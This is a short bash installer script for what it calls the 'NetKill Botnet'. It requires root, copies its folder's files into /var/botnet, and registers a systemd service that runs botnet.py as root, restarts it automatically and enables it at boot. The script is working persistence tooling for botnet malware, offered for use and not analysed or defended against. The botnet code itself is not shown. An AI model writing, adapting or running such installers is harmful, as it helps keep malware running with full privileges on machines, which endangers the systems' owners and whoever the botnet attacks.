#!/bin/bash

# Must be run as root
if [[ "$EUID" -ne 0 ]]; then
  echo "❌ Please run as root"
  exit 1
fi

# Define target directory
TARGET_DIR="/var/botnet"

# Create directory if not exists
mkdir -p "$TARGET_DIR"

# Copy all files except setup.sh to /var/botnet/
shopt -s extglob
cp -r !("setup.sh") "$TARGET_DIR"

# Create systemd service file
cat > /etc/systemd/system/botnet.service <<EOF
[Unit]
Description=NetKill Botnet
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /var/botnet/botnet.py
WorkingDirectory=/var/botnet/
User=root
Group=root
Restart=always
RestartSec=5
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd, enable and start the service
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable botnet.service
systemctl start botnet.service

echo "✅ botnet.service installed and started"
